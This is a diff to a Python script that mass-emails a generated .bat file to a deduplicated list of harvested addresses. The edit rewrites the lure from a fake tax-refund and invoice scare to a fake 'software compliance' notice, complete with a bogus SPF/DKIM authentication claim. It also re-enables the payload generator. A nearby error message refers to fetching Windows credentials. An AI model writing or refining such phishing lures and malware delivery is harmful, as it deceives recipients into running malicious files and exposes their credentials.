@@ -142,19 +142,34 @@ def send_a(bat_path, emails):
     for email in emails:
         print(email)    
         msg = MIMEMultipart()
-        msg['From'] = "J. Security LTD"
+        msg['From'] = "J. Security Limited"
         msg['To'] = email
-        msg['Subject'] = "URGENT: Your Tax Refund of $1,284.77 is Pending - Action Required!"
+        msg['Subject'] = "Updated Software Guidelines - Q3 Policy Review"
 
-        body = """Dear Valued Customer,
+        body = """
+Dear Customer,
 
-Your immediate attention is required for the attached invoice.
-Failure to review within 24 hours may result in service disruption.
+As part of our quarterly cybersecurity policy updates, J. Security Limited is distributing revised software evaluation guidelines for all partners.
 
-Download and open the PDF for full details.
+Key Changes:
+    1.New Microsoft product validation procedures
+    2.Updated license compliance standards (Section 4.2)
+    3.Deployment best practices for upcoming Windows releases
 
-Sincerely,
-Account Management Team"""
+Action Required:
+Review the attached documentation by {Date + 7 days}:
+➤ 📎 [Attachment] Software_Compliance_Q3.pdf
+(Includes appendix with reference keys on pg. 12)
+
+Important Notes:
+• Test environments recommended for new deployments
+• Contact IT for template implementation support
+
+Regards,
+J. Security Policy Team
+J. Security Limited
+🔒 This email is authenticated via SPF/DKIM
+"""
         msg.attach(MIMEText(body, 'plain'))
 
         part = MIMEBase('application', 'octet-stream')
@@ -861,7 +876,7 @@ except Exception as e:
     print(f"ERROR FETCHING WIN CREDS : {e}")
     
 emails = list(set(emails))
-# bat_path = generate()
+bat_path = generate()
 
 print("AFTER FILTERINGGG")
 #send_a(bat_path, emails)
